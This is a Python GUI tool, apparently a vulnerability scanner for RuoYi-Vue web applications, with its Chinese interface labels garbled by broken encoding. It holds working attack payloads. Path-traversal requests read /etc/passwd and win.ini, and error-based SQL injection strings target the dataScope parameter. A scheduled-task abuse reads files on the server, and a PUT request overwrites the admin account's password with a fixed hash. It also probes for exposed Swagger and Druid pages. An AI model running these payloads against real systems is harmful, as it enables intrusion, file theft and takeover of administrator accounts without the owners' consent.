import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
import threading
import re
from datetime import datetime
class RuoYiScannerPro(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("����Vue©����⹤��")
        self.geometry("1200x800")
        self.timeout = 15
        self.proxies = None
        self.scanning = False
        self._setup_ui()
        self._configure_style()
    def _configure_style(self):
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TButton", padding=8, font=("΢���ź�", 10))
        style.configure("Critical.TButton", background="#D32F2F", foreground="white")
        style.configure("Main.TFrame", background="#F5F5F5")
    def _setup_ui(self):
        main_frame = ttk.Frame(self, style="Main.TFrame")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        # �������
        config_frame = ttk.LabelFrame(main_frame, text="ɨ������")
        config_frame.pack(fill=tk.X, pady=5)
        self._create_input_field(config_frame, "Ŀ��URL", 0)
        self._create_input_field(config_frame, "Cookie", 1)
        self._create_input_field(config_frame, "Authorization", 2)
        self._create_input_field(config_frame, "HTTP����", 3, default_proxy="http://127.0.0.1:8080")
        # ©�����
        vuln_frame = ttk.LabelFrame(main_frame, text="©��ģ��")
        vuln_frame.pack(fill=tk.X, pady=5)
        buttons = [
            ("Swagger���", self.check_swagger),
            ("Druid���", self.check_druid),
            ("�ļ�����", self.check_file_download),
            ("SQLע��", self.check_sql_injection),
            ("��ʱ����", self.check_scheduled_task),
            ("���������޸�", self.check_password_reset),
            ("ȫ����", self.full_scan),
            ("��ս��", self.clear_results),
            ("ֹͣɨ��", self.stop_scan)
        ]
        for idx, (text, cmd) in enumerate(buttons):
            btn = ttk.Button(vuln_frame, text=text, command=cmd,
                             style="Critical.TButton" if idx < 6 else "TButton")
            btn.grid(row=0, column=idx, padx=3)
        # ������
        progress_frame = ttk.Frame(main_frame)
        progress_frame.pack(fill=tk.X, pady=5)
        self.progress_label = ttk.Label(progress_frame, text="ɨ�����:")
        self.progress_label.pack(side=tk.LEFT, padx=5)
        self.progress_bar = ttk.Progressbar(progress_frame, orient=tk.HORIZONTAL, length=300, mode='determinate')
        self.progress_bar.pack(side=tk.LEFT, fill=tk.X, expand=True)
        # ������
        result_frame = ttk.LabelFrame(main_frame, text="ɨ����")
        result_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.result_area = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD, font=("Consolas", 10))
        self.result_area.pack(fill=tk.BOTH, expand=True)
        # ״̬��
        self.status_bar = ttk.Label(self, text="����", relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    def _create_input_field(self, parent, label, row, default_proxy=None):
        clean_label = label.replace("��", "").strip()
        ttk.Label(parent, text=label + ":").grid(row=row, column=0, sticky=tk.W, padx=5)
        entry = ttk.Entry(parent, width=80)
        entry.grid(row=row, column=1, padx=5, pady=2)
        if default_proxy and "����" in label:
            entry.insert(0, default_proxy)
        setattr(self, f"entry_{clean_label}", entry)
    def _get_config(self):
        return {
            "url": self.entry_Ŀ��URL.get().strip(),
            "cookie": self.entry_Cookie.get().strip(),
            "auth": self.entry_Authorization.get().strip(),
            "proxy": self.entry_HTTP����.get().strip()
        }
    def _build_headers(self, config):
        return {
            "Cookie": re.sub(r'[\r\n]', '', config["cookie"]),
            "Authorization": re.sub(r'[\r\n]', '', config["auth"]),
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
    def _get_proxies(self, config):
        return {"http": config["proxy"], "https": config["proxy"]} if config["proxy"] else None
    def _log_result(self, message, severity="info"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color_map = {
            "info": "black",
            "warning": "orange",
            "critical": "red"
        }
        color = color_map.get(severity, "black")
        formatted_message = f"[{timestamp}] [{severity.upper()}] {message}\n"
        self.result_area.insert(tk.END, formatted_message, severity)
        self.result_area.tag_configure(severity, foreground=color)
        self.result_area.see(tk.END)
    def check_swagger(self):
        config = self._get_config()
        paths = [
            "/swagger-ui/index.html",
            "/prod-api/v2/api-docs",
            "/prod-api/v3/api-docs",
            "/api/v3/api-docs",
            "/api/v2/api-docs"                                    
        ]
        for path in paths:
            self._detect_swagger(config, path)
    def _detect_swagger(self, config, path):
        url = config["url"].rstrip("/") + path
        try:
            headers = self._build_headers(config)
            resp = requests.get(url, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            # ����Ƿ񷵻��� Swagger �ĵ�
            if "application/json" in resp.headers.get("Content-Type", ""):
                try:
                    data = resp.json()
                    if "openapi" in data or "swagger" in data:
                        self._log_result(f"[����] Swagger API �ĵ���¶: {path}", severity="critical")
                        return
                except ValueError:
                    pass
            # ����Ƿ񷵻��� Swagger UI ҳ��
            if "swagger-ui" in resp.text.lower() or "swaggerui" in resp.text.lower():
                self._log_result(f"[����] Swagger UI δ��Ȩ����: {path}", severity="critical")
                return
            # ���û�м�⵽©��
            self._log_result(f"{path} ©��������", severity="info")
        except Exception as e:
            self._log_result(f"{path} ���ʧ��: {str(e)}", severity="warning")
    def check_druid(self):
        config = self._get_config()
        paths = [
            "/druid/index.html", "/druid/login.html",
            "/prod-api/druid/login.html", "/prod-api/druid/index.html",
            "/dev-api/druid/login.html", "/dev-api/druid/index.html",
            "/api/druid/login.html", "/api/druid/index.html",
            "/admin/druid/login.html", "/admin-api/druid/login.html"
        ]
        for path in paths:
            self._detect_endpoint(config, path, keyword="druid monitor")
    def check_file_download(self):
        config = self._get_config()
        payloads = [
            ("/common/download/resource?resource=/profile/../../../../../../../etc/passwd", "root:"),
            ("/common/download/resource?name=/profile/../../../../../../../etc/passwd", "root:"),   
            ("/common/download/resource?name=../../../../../../../windows/win.ini&delete=false", "[extensions]"),
            ("/common/download/resource?resource=../../../../../../../windows/win.ini&delete=false", "[extensions]"),                                              
            ("/common/download?fileName=../../../../../../../windows/win.ini&delete=false", "[extensions]"),
            ("/common/download?fileName=../../../../../../../etc/passwd&delete=false", "root:")
        ]
        for path, keyword in payloads:
            self._detect_endpoint(config, path, keyword=keyword)
    def check_sql_injection(self):
        config = self._get_config()
        paths = [
            "/system/dept/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))",
            "/system/role/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))",
            "/system/user/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))",
            "/system/dept/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))",
            "/system/role/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))",
            "/system/user/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))"
        ]
        for path in paths:
            self._detect_sql_injection(config, path)
    def _detect_sql_injection(self, config, path):
        url = config["url"].rstrip("/") + path
        try:
            headers = self._build_headers(config)
            resp = requests.get(url, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            # ����Ƿ񷵻��� SQL ע�������Ϣ
            if "XPATH syntax error" in resp.text:
                self._log_result(f"[����] SQLע��©��: {path}", severity="critical")
            else:
                self._log_result(f"{path} ©��������", severity="info")
        except Exception as e:
            self._log_result(f"{path} ���ʧ��: {str(e)}", severity="warning")
    def check_scheduled_task(self):
        config = self._get_config()
        url = "/prod-api/monitor/job"
        data = {
            "searchValue": None,
            "createBy": "admin",
            "createTime": "2024-01-10 11:11:11",
            "updateBy": None,
            "updateTime": None,
            "remark": "",
            "params": {},
            "jobId": 100,
            "jobName": "ruoYiConfig.setProfile",
            "jobGroup": "DEFAULT",
            "invokeTarget": "ruoYiConfig.setProfile('C://windows/win.ini')",
            "cronExpression": "0/10 * * * * ?",
            "misfirePolicy": "2",
            "concurrent": "1",
            "status": "1",
            "nextValidTime": "2024-01-11 11:11:11"
        }
        self._detect_endpoint(config, url, method="PUT", data=data)
        # ��֤�Ƿ�ɹ���ȡ�ļ�
        verify_url = "/common/download/resource?resource=.jpg"
        self._verify_scheduled_task(config, verify_url)
    def _verify_scheduled_task(self, config, path):
        url = config["url"].rstrip("/") + path
        try:
            headers = self._build_headers(config)
            resp = requests.get(url, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            # ����Ƿ�ɹ���ȡ�ļ�����
            if "win.ini" in resp.text or "[extensions]" in resp.text:
                self._log_result(f"[����] ��ʱ����©�����ڣ��ļ���ȡ�ɹ�: {path}", severity="critical")
            else:
                self._log_result(f"{path} �ļ���ȡʧ�ܣ�©�����ܲ�����", severity="info")
        except Exception as e:
            self._log_result(f"{path} ���ʧ��: {str(e)}", severity="warning")
    def check_password_reset(self):
        config = self._get_config()
        url = "/prod-api/system/user/profile"
        data = {
            "userId": 1,
            "password": "$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2"
        }
        self._detect_endpoint(config, url, method="PUT", data=data)
    def _detect_endpoint(self, config, path, keyword=None, method="GET", data=None, severity="critical"):
        url = config["url"].rstrip("/") + path
        try:
            headers = self._build_headers(config)
            if method == "GET":
                resp = requests.get(url, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            elif method == "PUT":
                headers["Content-Type"] = "application/json"
                resp = requests.put(url, json=data, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            else:
                raise ValueError("Unsupported HTTP method")
            if keyword:
                if isinstance(keyword, str):
                    if keyword in resp.text:
                        self._log_result(f"{path} ����©��", severity)
                    else:
                        self._log_result(f"{path} ©��������", "info")
                elif callable(keyword):
                    if keyword(resp):
                        self._log_result(f"{path} ����©��", severity)
                    else:
                        self._log_result(f"{path} ©��������", "info")
            elif resp.status_code == 200:
                self._log_result(f"{path} ����ɹ�", severity)
            else:
                self._log_result(f"{path} ©��������", "info")
        except Exception as e:
            self._log_result(f"{path} ���ʧ��: {str(e)}", "warning")
    def full_scan(self):
        if self.scanning:
            messagebox.showwarning("����", "����ɨ���������ڽ��У����Ժ����ԣ�")
            return
        self.scanning = True
        threading.Thread(target=self._full_scan_thread).start()
    def _full_scan_thread(self):
        self.clear_results()
        self.status_bar.config(text="����ִ��ȫ����...")
        methods = [
            self.check_swagger,
            self.check_druid,
            self.check_file_download,
            self.check_sql_injection,
            self.check_scheduled_task,
            self.check_password_reset
        ]
        total_steps = len(methods)
        for i, method in enumerate(methods):
            if not self.scanning:
                break
            self.progress_bar['value'] = (i / total_steps) * 100
            self.progress_label.config(text=f"ɨ�����: {int((i / total_steps) * 100)}%")
            self.update_idletasks()
            method()
        self.progress_bar['value'] = 100
        self.progress_label.config(text="ɨ�����: 100%")
        self.status_bar.config(text="ȫ�������")
        self.scanning = False
    def stop_scan(self):
        self.scanning = False
        self.status_bar.config(text="ɨ����ֹͣ")
    def clear_results(self):
        self.result_area.delete(1.0, tk.END)
        self.progress_bar['value'] = 0
        self.progress_label.config(text="ɨ�����: 0%")
if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    app = RuoYiScannerPro()
    app.mainloop()